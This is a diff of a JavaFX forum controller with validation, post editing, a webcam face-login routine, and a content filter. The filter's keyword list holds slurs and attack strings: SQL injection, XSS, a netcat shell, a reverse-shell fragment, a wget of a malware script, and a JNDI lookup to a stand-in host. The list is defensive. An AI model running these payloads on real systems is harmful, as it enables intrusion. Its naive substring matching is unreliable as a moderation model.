+            hideError(surveyQuestionField, questionErrorLabel);
+        }
+    }
+
+    private void validateSurveyUser(String email) {
+        if (email.isEmpty()) {
+            addSurveyUserButton.setDisable(true);
+            showError(surveyUserField, surveyUserErrorLabel, "L'email ne peut pas être vide");
+        } else if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
+            addSurveyUserButton.setDisable(true);
+            showError(surveyUserField, surveyUserErrorLabel, "Format d'email invalide");
+        } else if (forumServiceFP.getUserByEmail(email) == -1) {
+            addSurveyUserButton.setDisable(true);
+            showError(surveyUserField, surveyUserErrorLabel, "Cet utilisateur n'existe pas");
+        } else if (surveyUsersListView.getItems().contains(email)) {
+            addSurveyUserButton.setDisable(true);
+            showError(surveyUserField, surveyUserErrorLabel, "Cet utilisateur est déjà dans la liste");
+        } else {
+            hideError(surveyUserField, surveyUserErrorLabel);
+            addSurveyUserButton.setDisable(false);
+        }
+    }
+
+    private void validateEditChoice(String choice) {
+        if (choice.isEmpty()) {
+            editChoiceField.getStyleClass().remove("valid-field");
+            editChoiceField.getStyleClass().add("text-field-error");
+            editAddChoiceButton.setDisable(true);
+            showError(editChoiceField, editChoiceErrorLabel, "Le choix ne peut pas être vide");
+        } else if (choice.length() > 50) {
+            editChoiceField.getStyleClass().remove("valid-field");
+            editChoiceField.getStyleClass().add("text-field-error");
+            editAddChoiceButton.setDisable(true);
+            showError(editChoiceField, editChoiceErrorLabel, "Le choix ne doit pas dépasser 50 caractères");
+        } else if (editChoicesListView.getItems().contains(choice)) {
+            editChoiceField.getStyleClass().remove("valid-field");
+            editChoiceField.getStyleClass().add("text-field-error");
+            editAddChoiceButton.setDisable(true);
+            showError(editChoiceField, editChoiceErrorLabel, "Ce choix existe déjà");
+        } else {
+            editChoiceField.getStyleClass().remove("text-field-error");
+            editChoiceField.getStyleClass().add("valid-field");
+            hideError(editChoiceField, editChoiceErrorLabel);
+            editAddChoiceButton.setDisable(false);
+        }
+    }
+
+    private void validateEditSurveyUser(String email) {
+        if (email.isEmpty()) {
+            editAddSurveyUserButton.setDisable(true);
+            showError(editSurveyUserField, editSurveyUserErrorLabel, "L'email ne peut pas être vide");
+        } else if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
+            editAddSurveyUserButton.setDisable(true);
+            showError(editSurveyUserField, editSurveyUserErrorLabel, "Format d'email invalide");
+        } else if (forumServiceFP.getUserByEmail(email) == -1) {
+            editAddSurveyUserButton.setDisable(true);
+            showError(editSurveyUserField, editSurveyUserErrorLabel, "Cet utilisateur n'existe pas");
+        } else if (editSurveyUsersListView.getItems().contains(email)) {
+            editAddSurveyUserButton.setDisable(true);
+            showError(editSurveyUserField, editSurveyUserErrorLabel, "Cet utilisateur est déjà dans la liste");
+        } else {
+            hideError(editSurveyUserField, editSurveyUserErrorLabel);
+            editAddSurveyUserButton.setDisable(false);
+        }
+    }
+
+    private void validateEditTitle(String title) {
+        if (title.isEmpty()) {
+            showError(editAnnouncementTitleField, editTitleErrorLabel, "Le titre ne peut pas être vide");
+        } else if (title.length() > 50) {
+            showError(editAnnouncementTitleField, editTitleErrorLabel, "Le titre ne doit pas dépasser 50 caractères");
+        } else {
+            hideError(editAnnouncementTitleField, editTitleErrorLabel);
+        }
+    }
+
+    private void validateEditContent(String content) {
+        if (content.isEmpty()) {
+            showError(editAnnouncementContentField, editContentErrorLabel, "Le contenu ne peut pas être vide");
+        } else if (content.length() > 500) {
+            showError(editAnnouncementContentField, editContentErrorLabel, "Le contenu ne doit pas dépasser 500 caractères");
+        } else {
+            hideError(editAnnouncementContentField, editContentErrorLabel);
+        }
+    }
+
+    private void validateEditQuestion(String question) {
+        if (question.isEmpty()) {
+            showError(editSurveyQuestionField, editSurveyQuestionErrorLabel, "La question ne peut pas être vide");
+        } else if (question.length() > 200) {
+            showError(editSurveyQuestionField, editSurveyQuestionErrorLabel, "La question ne doit pas dépasser 200 caractères");
+        } else {
+            hideError(editSurveyQuestionField, editSurveyQuestionErrorLabel);
+        }
+    }
+
+    private void validateEditTags(String tags, Label errorLabel) {
+        TextField field = tags.equals(editSurveyTagsField.getText()) ? editSurveyTagsField : editAnnouncementTagsField;
+
+        if (tags.length() > 100) {
+            showError(field, errorLabel, "Les tags ne doivent pas dépasser 100 caractères");
+            return;
+        }
+
+        if (!tags.isEmpty()) {
+            if (!tags.matches("^[a-zA-Z0-9,\\s]+$")) {
+                showError(field, errorLabel, "Les tags ne doivent contenir que des lettres, chiffres et virgules");
+                return;
+            }
+
+            String[] tagArray = tags.split(",");
+            Set<String> uniqueTags = new HashSet<>();
+
+            for (String tag : tagArray) {
+                String trimmedTag = tag.trim();
+                if (!trimmedTag.isEmpty()) {
+                    if (!uniqueTags.add(trimmedTag)) {
+                        showError(field, errorLabel, "Tag '" + trimmedTag + "' est en double");
+                        return;
+                    }
+                }
+            }
+
+            for (String tag : tagArray) {
+                String trimmedTag = tag.trim();
+                if (trimmedTag.length() > 20) {
+                    showError(field, errorLabel, "Chaque tag ne doit pas dépasser 20 caractères");
+                    return;
+                }
+            }
+        }
+
+        hideError(field, errorLabel);
+    }
+
+    //+++++++++++
+    private void showError(TextInputControl field, Label errorLabel, String message) {
+        if (field != null) {
+            field.getStyleClass().removeAll("valid-fieldFP", "text-field-errorFP");
+            field.getStyleClass().addAll("text-fieldFP", "text-field-errorFP"); // Add base class first
+        }
+        if (errorLabel != null) {
+            errorLabel.getStyleClass().add("error-labelFP");
+            errorLabel.setText(message);
+            errorLabel.setVisible(true);
+        }
+    }
+
+    private void hideError(TextInputControl field, Label errorLabel) {
+        if (field != null) {
+            field.getStyleClass().removeAll("text-field-errorFP", "valid-fieldFP");
+            field.getStyleClass().addAll("text-fieldFP", "valid-fieldFP"); // Add base class first
+        }
+        if (errorLabel != null) {
+            errorLabel.setVisible(false);
+        }
+    }
+
+    //+++++++++++
+    private void editPost(Post post) {
+        currentPost = post;
+
+        if (post instanceof Announcement announcement) {
+            editAnnouncementFields.setVisible(true);
+            editSurveyFields.setVisible(false);
+
+            editAnnouncementTitleField.setText(announcement.getAnnouncementTitle());
+            editAnnouncementContentField.setText(announcement.getAnnouncementContent());
+            editAnnouncementTagsField.setText(announcement.getAnnouncementTags());
+            editAnnouncementFileField.setText(announcement.getCheminFichier());
+            editAnnouncementStatusComboBox.setValue(announcement.getStatus());
+            editAnnouncementUserField.setText(forumServiceFP.getEmailById(post.getIdUser()));
+
+        } else if (post instanceof Survey survey) {
+            editAnnouncementFields.setVisible(false);
+            editSurveyFields.setVisible(true);
+
+            editSurveyQuestionField.setText(survey.getSurveyQuestion());
+            editSurveyTagsField.setText(survey.getSurveyTags());
+            editSurveyFileField.setText(survey.getCheminFichier());
+            editSurveyStatusComboBox.setValue(survey.getStatus());
+            editSurveyAuthorField.setText(forumServiceFP.getEmailById(post.getIdUser()));
+
+            editChoicesListView.getItems().clear();
+            List<Choix> choices = choixService.rechercher().stream()
+                    .filter(c -> c.getPostId() == survey.getPostId())
+                    .toList();
+
+            for (Choix choice : choices) {
+                editChoicesListView.getItems().add(choice.getChoix());
+            }
+
+            editSurveyUsersListView.getItems().clear();
+            if (survey.getSurveyUserList() != null && !survey.getSurveyUserList().isEmpty()) {
+                editSurveyUsersListView.getItems().addAll(
+                        survey.getSurveyUserList().split(",")
+                );
+            }
+        }
+    }
+
+    private void handleEditButton(Post post) {
+        currentPost = post;
+
+        rightTabPane.getSelectionModel().select(2);
+        editPost(post);
+    }
+
+    private void handleDeletePost(Post post) {
+        if (currentPost == null) return;
+
+        Alert confirm = new Alert(Alert.AlertType.CONFIRMATION);
+        confirm.setTitle("Delete Post");
+        confirm.setHeaderText("Are you sure you want to delete this post?");
+        confirm.setContentText("This action cannot be undone.");
+
+        if (confirm.showAndWait().get() == ButtonType.OK) {
+            postService.supprimer(currentPost);
+            refreshPosts();
+        }
+    }
+
+    @FXML
+    private void handleDeletePost() {
+        if (currentPost == null) return;
+
+        Alert confirm = new Alert(Alert.AlertType.CONFIRMATION);
+        confirm.setTitle("Delete Post");
+        confirm.setHeaderText("Are you sure you want to delete this post?");
+        confirm.setContentText("This action cannot be undone.");
+
+        if (confirm.showAndWait().get() == ButtonType.OK) {
+            postService.supprimer(currentPost);
+            refreshPosts();
+        }
+    }
+
+    @FXML
+    private void handleUpdatePost() {
+        if (currentPost == null) return;
+
+        if (currentPost instanceof Announcement announcement) {
+            String title = editAnnouncementTitleField.getText().trim();
+            String content = editAnnouncementContentField.getText().trim();
+            String tags = editAnnouncementTagsField.getText().trim();
+            String filePath = editAnnouncementFileField.getText().trim();
+            String status = editAnnouncementStatusComboBox.getValue();
+            String userEmail = editAnnouncementUserField.getText().trim();
+
+            StringBuilder errors = new StringBuilder();
+            if (title.isEmpty()) errors.append("- Title cannot be empty\n");
+            if (title.length() > 50) errors.append("- Title must not exceed 50 characters\n");
+            if (content.isEmpty()) errors.append("- Content cannot be empty\n");
+            if (content.length() > 500) errors.append("- Content must not exceed 500 characters\n");
+            if (userEmail.isEmpty()) errors.append("- User email cannot be empty\n");
+            if (!userEmail.matches("^[A-Za-z0-9+_.-]+@(.+)$")) errors.append("- Invalid email format\n");
+
+            int userId = forumServiceFP.getUserByEmail(userEmail);
+            if (userId == -1) errors.append("- User not found\n");
+
+            if (!errors.isEmpty()) {
+                showAlertFP("Validation Error", errors.toString(), Alert.AlertType.ERROR);
+                return;
+            }
+
+            try {
+                announcement.setAnnouncementTitle(title);
+                announcement.setAnnouncementContent(content);
+                announcement.setAnnouncementTags(tags);
+                announcement.setCheminFichier(filePath);
+                announcement.setStatus(status);
+                announcement.setDateModification(LocalDateTime.now());
+                announcement.setIdUser(userId);
+
+                postService.modifier(announcement);
+                showAlertFP("Success", "Announcement updated successfully", Alert.AlertType.INFORMATION);
+                refreshPosts();
+                clearEditFields();
+                leftTabPane.getSelectionModel().select(0);
+                handleBackLeft();
+            } catch (Exception e) {
+                showAlertFP("Error", "Failed to update announcement: " + e.getMessage(), Alert.AlertType.ERROR);
+            }
+
+        } else if (currentPost instanceof Survey survey) {
+            String question = editSurveyQuestionField.getText().trim();
+            String tags = editSurveyTagsField.getText().trim();
+            String filePath = editSurveyFileField.getText().trim();
+            String status = editSurveyStatusComboBox.getValue();
+            String userEmail = editSurveyAuthorField.getText().trim();
+            List<String> choices = new ArrayList<>(editChoicesListView.getItems());
+            List<String> users = new ArrayList<>(editSurveyUsersListView.getItems());
+
+            StringBuilder errors = new StringBuilder();
+            if (question.isEmpty()) errors.append("- Question cannot be empty\n");
+            if (question.length() > 200) errors.append("- Question must not exceed 200 characters\n");
+            if (choices.size() < 2) errors.append("- Survey must have at least two choices\n");
+            if (userEmail.isEmpty()) errors.append("- User email cannot be empty\n");
+            if (!userEmail.matches("^[A-Za-z0-9+_.-]+@(.+)$")) errors.append("- Invalid email format\n");
+
+            int userId = forumServiceFP.getUserByEmail(userEmail);
+            if (userId == -1) errors.append("- User not found\n");
+
+            if (!errors.isEmpty()) {
+                showAlertFP("Validation Error", errors.toString(), Alert.AlertType.ERROR);
+                return;
+            }
+
+            try {
+                survey.setSurveyQuestion(question);
+                survey.setSurveyTags(tags);
+                survey.setCheminFichier(filePath);
+                survey.setStatus(status);
+                survey.setDateModification(LocalDateTime.now());
+                survey.setIdUser(userId);
+                survey.setSurveyUserList(String.join(",", users));
+
+                List<Choix> existingChoices = choixService.rechercher().stream()
+                        .filter(c -> c.getPostId() == survey.getPostId())
+                        .toList();
+
+                for (Choix existingChoice : existingChoices) {
+                    if (!choices.contains(existingChoice.getChoix())) {
+                        choixService.supprimer(existingChoice);
+                    }
+                }
+
+                for (String choiceText : choices) {
+                    if (existingChoices.stream().noneMatch(c -> c.getChoix().equals(choiceText))) {
+                        Choix newChoice = new Choix(0, survey.getPostId(), choiceText, 0, 0);
+                        choixService.ajouter(newChoice);
+                    }
+                }
+
+                postService.modifier(survey);
+                showAlertFP("Success", "Survey updated successfully", Alert.AlertType.INFORMATION);
+                refreshPosts();
+                clearEditFields();
+                leftTabPane.getSelectionModel().select(0);
+                handleBackLeft();
+            } catch (Exception e) {
+                showAlertFP("Error", "Failed to update survey: " + e.getMessage(), Alert.AlertType.ERROR);
+            }
+        }
+    }
+
+    //+++++++++++
+    @FXML
+    private void handleBackButton() {
+        leftTabPane.getSelectionModel().select(0);
+        currentPost = null;
+        newCommentField.clear();
+    }
+
+    @FXML
+    private void handleBackLeft() {
+        rightTabPane.getSelectionModel().select(0);
+    }
+
+    @FXML
+    private void handleAddPostButton() {
+        rightTabPane.getSelectionModel().select(1);
+        postTypeComboBox.getSelectionModel().select(0);
+        handlePostTypeChange();
+    }
+
+    //+++++++++++
+    private String formatDateTime(LocalDateTime dateTime) {
+        return dateTime.toString().replace("T", " ");
+    }
+
+    private void handleVote(Post post, boolean isUpvote) {
+        if (isUpvote) {
+            post.setVotes(post.getVotes() + 1);
+        } else {
+            post.setVotes(post.getVotes() - 1);
+        }
+        postService.modifier(post);
+        refreshPosts();
+
+        if (leftTabPane.getSelectionModel().getSelectedIndex() == 1) {
+            showPostDetails(post);
+        }
+    }
+
+    private void showAlertFP(String title, String content, Alert.AlertType type) {
+        Alert alert = new Alert(type);
+        alert.setTitle(title);
+        alert.setHeaderText(null);
+        alert.setContentText(content);
+        alert.showAndWait();
+    }
+
+    private void handleChoiceVote(Choix choice) {
+        choice.setChoiceVotesCount(choice.getChoiceVotesCount() + 1);
+        choixService.modifier(choice);
+        refreshPosts();
+
+        if (leftTabPane.getSelectionModel().getSelectedIndex() == 1) {
+            showPostDetails(currentPost);
+        }
+    }
+
+    private void addRemoveButton(ListView<String> listView, String itemToRemove) {
+        listView.setCellFactory(lv -> new ListCell<String>() {
+            @Override
+            protected void updateItem(String item, boolean empty) {
+                super.updateItem(item, empty);
+                if (empty || item == null) {
+                    setGraphic(null);
+                } else {
+                    HBox cell = new HBox(10);
+                    Label label = new Label(item);
+                    Button deleteBtn = new Button("Supprimer");
+                    deleteBtn.getStyleClass().add("delete-button");
+                    deleteBtn.setOnAction(e -> listView.getItems().remove(item));
+                    cell.getChildren().addAll(label, deleteBtn);
+                    setGraphic(cell);
+                }
+            }
+        });
+
+        listView.getItems().add(itemToRemove);
+
+        listView.setOnKeyPressed(e -> {
+            if (e.getCode() == KeyCode.DELETE) {
+                String selectedItem = listView.getSelectionModel().getSelectedItem();
+                if (selectedItem != null) {
+                    listView.getItems().remove(selectedItem);
+                }
+            }
+        });
+    }
+
+    //+++++++++++
+    @FXML
+    private void handleAddChoice() {
+        String choice = choiceField.getText().trim();
+        if (!choice.isEmpty() && !choicesListView.getItems().contains(choice)) {
+            addRemoveButton(choicesListView, choice);
+            choiceField.clear();
+            addChoiceButton.setDisable(true);
+        }
+    }
+
+    @FXML
+    private void handleAddSurveyUser() {
+        String email = surveyUserField.getText().trim();
+        if (!email.isEmpty() && !surveyUsersListView.getItems().contains(email)) {
+            addRemoveButton(surveyUsersListView, email);
+            surveyUserField.clear();
+            addSurveyUserButton.setDisable(true);
+        }
+    }
+
+    @FXML
+    private void handleBrowseFile(ActionEvent event) {
+        FileChooser fileChooser = new FileChooser();
+        fileChooser.setTitle("Select File");
+
+        FileChooser.ExtensionFilter imageFilter = new FileChooser.ExtensionFilter("Image Files", "*.jpg", "*.png");
+        fileChooser.getExtensionFilters().add(imageFilter);
+
+        File file = fileChooser.showOpenDialog(null);
+        if (file != null) {
+            String fileName = file.getName();
+            String extension = fileName.substring(fileName.lastIndexOf(".") + 1).toLowerCase();
+
+            if (!extension.equals("jpg") && !extension.equals("png")) {
+                showAlertFP("Invalid File", "Only JPG or PNG files are allowed.", Alert.AlertType.ERROR);
+                return;
+            }
+
+            Button button = (Button) event.getSource();
+            HBox hbox = (HBox) button.getParent();
+            TextField fileField = (TextField) hbox.getChildren().get(0);
+            fileField.setText(file.getAbsolutePath());
+        }
+    }
+
+    @FXML
+    private void handleAddEditChoice() {
+        String choice = editChoiceField.getText().trim();
+        if (!choice.isEmpty() && !editChoicesListView.getItems().contains(choice)) {
+            addRemoveButton(editChoicesListView, choice);
+            editChoiceField.clear();
+            editAddChoiceButton.setDisable(true);
+        }
+    }
+
+    @FXML
+    private void handleAddEditSurveyUser() {
+        String email = editSurveyUserField.getText().trim();
+        if (!email.isEmpty() && !editSurveyUsersListView.getItems().contains(email)) {
+            addRemoveButton(editSurveyUsersListView, email);
+            editSurveyUserField.clear();
+            editAddSurveyUserButton.setDisable(true);
+        }
+    }
+
+    @FXML
+    private void handleBrowseAnnouncementFile(ActionEvent actionEvent) {
+        handleBrowseFile(actionEvent);
+    }
+
+    @FXML
+    private void handleBrowseSurveyFile(ActionEvent actionEvent) {
+        handleBrowseFile(actionEvent);
+    }
+
+
+//****** New ForumNajdAvance
+
+    private boolean containsBadWords(Post post) {
+        // List of bad words (spam keywords)
+        List<String> badWords = Arrays.asList(
+                "fuck", "shit", "bitch", "asshole", "bastard", "cunt", "dick", "pussy", "whore", "slut",
+                "nigger", "faggot", "retard", "motherfucker", "cock", "twat", "damn", "hell", "crap", "jerk",
+                "buy", "cheap", "free", "win", "prize", "click", "here", "http", "www", "viagra", "casino",
+                "nude", "sex", "porn", "xxx", "blowjob", "anal", "deepthroat", "cum", "suck", "hentai",
+                "scam", "fraud", "loan", "credit", "money", "lottery", "bitcoin", "investment", "bet", "wager",
+                "merde", "putain", "salope", "connard", "enculé", "bordel", "fils de pute", "pute", "bite", "couilles",
+                "nique", "ta mère", "pd", "gouine", "tapette", "enculeur", "chier", "branleur", "défoncer", "cul", "chatte",
+                "acheter", "pas cher", "gratuit", "gagner", "prix", "cliquez", "ici", "http", "www", "viagra", "casino",
+                "nu", "sexe", "porno", "xxx", "sucer", "éjaculer", "pénétration", "orgasme", "hentai", "sperme",
+                "arnaque", "fraude", "crédit", "argent", "loterie", "bitcoin", "investissement", "pari", "mise",
+                "assassinat", "meurtre", "tuer", "bombe", "attentat", "terrorisme", "djihad", "explosif", "otage", "menace",
+                "viol", "pédophilie", "agression", "kidnapping", "enlèvement", "traite", "proxénétisme", "torture",
+                "drogue", "cocaïne", "héroïne", "meth", "ecstasy", "trafic", "blanchiment", "fraude", "escroquerie",
+                "piratage", "hacking", "ransomware", "darknet", "vente illégale", "corruption", "chantage", "extorsion",
+                "incendie criminel", "armes", "fusil", "kalachnikov", "mitraillette", "explosion", "dynamite",
+                "incitation à la haine", "racisme", "nazisme", "génocide", "massacre", "nettoyage ethnique",
+
+                // Agences de voyage en Tunisie
+                "Traveltodo", "JEKTIS TRAVEL", "Tunisie Promo", "Active Travel", "Tunisie Booking",
+                "TTA (Tunisian Travel Agency)", "Liberta Voyages", "Carthage Travel and Events (CTE)",
+
+                // Agences de voyage françaises
+                "Terres d'Aventure", "GO Voyages",
+
+                // Agences de voyage les plus populaires au monde
+                "Expedia", "Booking.com", "Agoda", "Lastminute.com", "Skyscanner", "Kiwi.com",
+
+                // SQL Injection
+                "' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a", "DROP TABLE", "UNION SELECT",
+                "INSERT INTO", "DELETE FROM", "xp_cmdshell", "EXEC sp_executesql",
+
+                // XSS (Cross-Site Scripting)
+                "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
+                "'><script>alert(1)</script>", "<svg/onload=alert('XSS')>",
+                "<iframe src='javascript:alert(1)'>", "document.cookie", "eval(",
+
+                // Command Injection
+                "; ls -la", "&& whoami", "|| cat /etc/passwd", "`id`", "$(reboot)",
+                "| nc -e /bin/sh", "wget http://malicious.com/malware.sh",
+
+                // Path Traversal
+                "../etc/passwd", "..\\..\\..\\windows\\system32\\cmd.exe",
+                "/etc/shadow", "/proc/self/environ",
+
+                // Common Payloads for Exploits
+                "${jndi:ldap://malicious.com/exploit}", "base64_decode(", "system(",
+                "shell_exec(", "import os", "subprocess.Popen(", "bash -i >& /dev/tcp/"
+
+        );
+
+        if (post instanceof Announcement announcement) {
+            return containsBadWords(announcement.getAnnouncementTitle(), badWords) ||
+                    containsBadWords(announcement.getAnnouncementContent(), badWords) ||
+                    containsBadWords(announcement.getAnnouncementTags(), badWords);
+        } else if (post instanceof Survey survey) {
+            return containsBadWords(survey.getSurveyQuestion(), badWords) ||
+                    containsBadWords(survey.getSurveyTags(), badWords);
+        } else if (post instanceof Comment comment) {
+            return containsBadWords(comment.getCommentContent(), badWords);
+        }
+
+        return false;
+    }
+
+    private boolean containsBadWords(String content, List<String> badWords) {
+        if (content == null || content.isEmpty()) {
+            return false; // No content, so no bad words
+        }
+
+        String lowerCaseContent = content.toLowerCase();
+        for (String word : badWords) {
+            if (lowerCaseContent.contains(word.toLowerCase())) {
+                return true; // Bad word found
+            }
+        }
+        return false; // No bad words found
+    }
+
+    private boolean isPostingTooFrequently(Post post) {
+        if (post == null) {
+            return false; // No post provided
+        }
+
+        // Get the user's email using the post's userId
+        String userEmail = forumServiceFP.getEmailById(post.getIdUser());
+        if (userEmail == null || userEmail.isEmpty()) {
+            return false; // No user email found
+        }
+
+        // Check if the user has posted within the cooldown period
+        Long lastPostTime = userLastPostTime.get(userEmail);
+        long currentTime = System.currentTimeMillis();
+
+        if (lastPostTime != null && (currentTime - lastPostTime) < POST_COOLDOWN) {
+            return true; // User is posting too frequently
+        }
+
+        // Update the user's last post time
+        userLastPostTime.put(userEmail, currentTime);
+        return false; // User is not posting too frequently
+    }
+
+    @FXML
+    public void handleSubmitPost() {
+        String selectedType = postTypeComboBox.getValue();
+        Forum selectedForum = forumComboBox.getValue();
+
+        if (selectedType == null) {
+            showAlertFP("Error", "Post Type Required", Alert.AlertType.ERROR);
+            return;
+        }
+
+        if (selectedForum == null) {
+            showAlertFP("Error", "Forum Required", Alert.AlertType.ERROR);
+            return;
+        }
+
+        // Create a new Post object based on the selected type
+        Post newPost = null;
+        String userEmail = "";
+
+        if ("Announcement".equals(selectedType)) {
+            String title = announcementTitleField.getText().trim();
+            String content = announcementContentField.getText().trim();
+            String tags = announcementTagsField.getText().trim();
+
+            // Validate fields
+            StringBuilder errors = new StringBuilder();
+            if (title.isEmpty()) errors.append("- Title cannot be empty\n");
+            if (title.length() > 50) errors.append("- Title must not exceed 50 characters\n");
+            if (content.isEmpty()) errors.append("- Content cannot be empty\n");
+            if (content.length() > 500) errors.append("- Content must not exceed 500 characters\n");
+
+            if (!errors.isEmpty()) {
+                showAlertFP("Validation Error", errors.toString(), Alert.AlertType.ERROR);
+                return;
+            }
+
+            userEmail = announcementUserField.getText().trim();
+
+            if (userEmail.isEmpty()) {
+                showAlertFP("Validation Error", "User email cannot be empty", Alert.AlertType.ERROR);
+                return;
+            }
+
+            int userId = forumServiceFP.getUserByEmail(userEmail);
+            if (userId == -1) {
+                showAlertFP("Validation Error", "User not found", Alert.AlertType.ERROR);
+                return;
+            }
+
+            newPost = new Announcement(
+                    0, // postId (auto-generated)
+                    selectedForum.getForumId(),
+                    userId,
+                    0, // votes
+                    LocalDateTime.now(), // dateCreation
+                    LocalDateTime.now(), // dateModification
+                    announcementFileField.getText(), // cheminFichier
+                    announcementStatusComboBox.getValue(), // status
+                    0, // nbrSignal
+                    title, // announcementTitle
+                    content, // announcementContent
+                    tags // announcementTags
+            );
+
+        } else if ("Survey".equals(selectedType)) {
+            String question = surveyQuestionField.getText().trim();
+            String tags = surveyTagsField.getText().trim();
+            List<String> choices = new ArrayList<>(choicesListView.getItems());
+            List<String> users = new ArrayList<>(surveyUsersListView.getItems());
+
+            // Validate fields
+            StringBuilder errors = new StringBuilder();
+            if (question.isEmpty()) errors.append("- Question cannot be empty\n");
+            if (question.length() > 200) errors.append("- Question must not exceed 200 characters\n");
+            if (choices.size() < 2) errors.append("- Survey must have at least two choices\n");
+
+            if (!errors.isEmpty()) {
+                showAlertFP("Validation Error", errors.toString(), Alert.AlertType.ERROR);
+                return;
+            }
+
+            userEmail = surveyAuthorField.getText().trim();
+
+            if (userEmail.isEmpty()) {
+                showAlertFP("Validation Error", "User email cannot be empty", Alert.AlertType.ERROR);
+                return;
+            }
+
+            int userId = forumServiceFP.getUserByEmail(userEmail);
+            if (userId == -1) {
+                showAlertFP("Validation Error", "User not found", Alert.AlertType.ERROR);
+                return;
+            }
+
+            newPost = new Survey(
+                    0, // postId (auto-generated)
+                    selectedForum.getForumId(),
+                    userId,
+                    0, // votes
+                    LocalDateTime.now(), // dateCreation
+                    LocalDateTime.now(), // dateModification
+                    surveyFileField.getText(), // cheminFichier
+                    surveyStatusComboBox.getValue(), // status
+                    0, // nbrSignal
+                    question, // surveyQuestion
+                    tags, // surveyTags
+                    String.join(",", users) // surveyUserList
+            );
+        }
+
+        // Check for bad words in the post
+        if (containsBadWords(newPost)) {
+            showAlertFP("Spam Detected", "Your post contains inappropriate content. Please revise your post.", Alert.AlertType.ERROR);
+            return;
+        }
+
+        // Check if the user is posting too frequently
+        if (isPostingTooFrequently(newPost)) {
+            showAlertFP("Posting Too Frequently", "You are posting too quickly. Please wait a moment before posting again.", Alert.AlertType.ERROR);
+            return;
+        }
+
+        // Submit the post
+        try {
+            postService.ajouter(newPost);
+
+            if (newPost instanceof Survey) {
+                Survey survey = (Survey) newPost;
+                for (String choiceText : choicesListView.getItems()) {
+                    Choix choice = new Choix(0, survey.getPostId(), choiceText, 0, 0);
+                    choixService.ajouter(choice);
+                }
+            }
+
+            showAlertFP("Success", "Post submitted successfully!", Alert.AlertType.INFORMATION);
+            refreshPosts();
+            clearFieldsFB();
+            handleBackLeft();
+        } catch (Exception e) {
+            showAlertFP("Error", "Failed to post: " + e.getMessage(), Alert.AlertType.ERROR);
+        }
+    }
+
+    @FXML
+    private void handleAddComment() {
+        if (currentPost == null) return;
+
+        String content = newCommentField.getText().trim();
+        if (content.isEmpty()) {
+            showError(newCommentField, commentErrorLabel, "Le commentaire ne peut pas être vide");
+            return;
+        }
+
+        // Create a new Comment object
+        Comment comment = new Comment(
+                0,
+                currentPost.getForumId(),
+                1, // Assuming this is the user ID
+                0,
+                LocalDateTime.now(),
+                LocalDateTime.now(),
+                "",
+                "active",
+                0,
+                content,
+                currentPost.getPostId()
+        );
+
+        // Check for bad words in the comment
+        if (containsBadWords(comment)) {
+            showAlertFP("Spam Detected", "Your comment contains inappropriate content. Please revise your comment.", Alert.AlertType.ERROR);
+            return;
+        }
+
+        // Check if the user is posting too frequently
+        if (isPostingTooFrequently(comment)) {
+            showAlertFP("Posting Too Frequently", "You are commenting too quickly. Please wait a moment before commenting again.", Alert.AlertType.ERROR);
+            return;
+        }
+
+        // Submit the comment
+        postService.ajouter(comment);
+        newCommentField.clear();
+        showComments(currentPost);
+    }
+
+
+//--------------------------------------------------------------------------------------------------------
+
+    @FXML
+    private void handleLogin() {
+        System.out.println("Starting face authentication...");
+        System.out.println("Python script path: " + pythonScriptPath);
+        System.out.println("DB path: " + dbPath);
+        // Démarrer l'opération asynchrone
+        CompletableFuture.supplyAsync(() -> {
+            Webcam webcam = null;
+            try {
+                // Obtenir la webcam par défaut
+                webcam = Webcam.getDefault();
+                if (webcam == null) {
+                    throw new RuntimeException("Aucune webcam trouvée.");
+                }
+
+                // Configurer la résolution de la webcam
+                webcam.setViewSize(WebcamResolution.VGA.getSize());
+                webcam.open();
+
+                // Capturer une image
+                BufferedImage image = webcam.getImage();
+                if (image == null) {
+                    throw new RuntimeException("Impossible de capturer l'image.");
+                }
+
+                // Sauvegarder l'image dans un fichier temporaire
+                File tempFile = File.createTempFile("login", ".jpg");
+                ImageIO.write(image, "JPG", tempFile);
+                System.out.println("Image capturée et sauvegardée : " + tempFile.getAbsolutePath());
+                return tempFile;
+            } catch (IOException e) {
+                throw new RuntimeException("Erreur lors de la capture de l'image : " + e.getMessage(), e);
+            } finally {
+                // Fermer la webcam
+                if (webcam != null && webcam.isOpen()) {
+                    webcam.close();
+                }
+            }
+        }).thenCompose(tempFile -> {
+            System.out.println("Début de l'authentification...");
+            // Authentifier l'image capturée
+            return authenticator.authenticateAsync(tempFile, pythonScriptPath, dbPath)
+                    .whenComplete((result, error) -> {
+                        // Supprimer le fichier temporaire après l'authentification
+                        if (tempFile != null && tempFile.exists()) {
+                            tempFile.delete();
+                            System.out.println("Fichier temporaire supprimé.");
+                        }
+                        // Gérer les erreurs
+                        if (error != null) {
+                            System.err.println("Erreur lors de l'authentification : " + error.getMessage());
+                        }
+                    });
+        }).thenAcceptAsync(result -> {
+            // Mettre à jour l'interface utilisateur en fonction du résultat
+            if (result) {
+                System.out.println("Match !");
+                // Mettre à jour l'UI pour un match réussi
+                Platform.runLater(() -> {
+                    // Exemple : Afficher un message de succès
+                    statusLabel.setText("Authentification réussie !");
+                    statusLabel.setStyle("-fx-text-fill: green;");
+                });
+            } else {
+                System.out.println("Pas de match.");
+                // Mettre à jour l'UI pour un échec
+                Platform.runLater(() -> {
+                    // Exemple : Afficher un message d'échec
+                    statusLabel.setText("Authentification échouée.");
+                    statusLabel.setStyle("-fx-text-fill: red;");
+                });
+            }
+        }, Platform::runLater).exceptionally(ex -> {
+            // Gérer les exceptions
+            ex.printStackTrace();
+            System.err.println("Erreur lors de la tentative de connexion : " + ex.getMessage());
+            // Mettre à jour l'UI en cas d'erreur
+            Platform.runLater(() -> {
+                statusLabel.setText("Erreur lors de l'authentification.");
+                statusLabel.setStyle("-fx-text-fill: red;");
+            });
+            return null;
+        });
+    }
+
 
 
 }
